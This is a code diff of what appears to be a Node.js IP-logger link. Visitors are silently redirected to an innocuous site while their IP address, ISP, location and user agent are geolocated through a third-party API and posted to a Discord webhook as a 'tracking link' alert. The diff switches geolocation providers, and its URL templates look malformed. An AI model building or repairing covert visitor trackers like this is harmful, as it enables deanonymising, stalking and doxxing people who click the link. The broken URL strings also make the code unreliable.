@@ -5,11 +5,10 @@ const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK;
 const REDIRECT_URL = process.env.REDIRECT_URL || 'https://guns.lol';
 
 app.get('/', async (req, res) => {
-    // 1. Safely parse out the real visitor IP from the Render proxy string
+    // 1. Extract the IP address safely
     let rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';
-    let clientIp = rawIp.split(',')[0].trim(); // Pulls position 0 safely
+    let clientIp = rawIp.split(',')[0].trim();
 
-    // 2. Clear out local server loop values
     if (clientIp.includes('::ffff:')) {
         clientIp = clientIp.replace('::ffff:', '');
     }
@@ -21,8 +20,8 @@ app.get('/', async (req, res) => {
 
     if (DISCORD_WEBHOOK_URL) {
         try {
-            // 3. Using native fetch() bypasses the Axios ERR_INVALID_URL adapter bug entirely
-            const geoResponse = await fetch(`http://ip-api.com{clientIp}?fields=61439`);
+            // 2. FIXED: Uses HTTPS to prevent Render from blocking the connection
+            const geoResponse = await fetch(`https://ipapi.co{clientIp}/json/`);
             const geoData = await geoResponse.json();
 
             const discordPayload = {
@@ -32,8 +31,9 @@ app.get('/', async (req, res) => {
                     description: "A user has accessed the tracking link.",
                     fields: [
                         { name: "IP Address", value: `\`${clientIp}\``, inline: true },
-                        { name: "ISP Network", value: `\`${geoData.isp || "Unknown"}\``, inline: true },
-                        { name: "Location", value: `\`${geoData.city || "Unknown"}, ${geoData.country || "Unknown"}\``, inline: false },
+                        // ipapi.co returns the ISP name inside the 'org' field
+                        { name: "ISP Network", value: `\`${geoData.org || "Unknown"}\``, inline: true },
+                        { name: "Location", value: `\`${geoData.city || "Unknown"}, ${geoData.country_name || "Unknown"}\``, inline: false },
                         { name: "Device / Agent", value: `\`\`\`${userAgent}\`\`\``, inline: false }
                     ],
                     footer: {
@@ -43,7 +43,7 @@ app.get('/', async (req, res) => {
                 }]
             };
 
-            // 4. Send directly to your Discord webhook using native fetch
+            // 3. Send the formatted payload to Discord
             await fetch(DISCORD_WEBHOOK_URL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
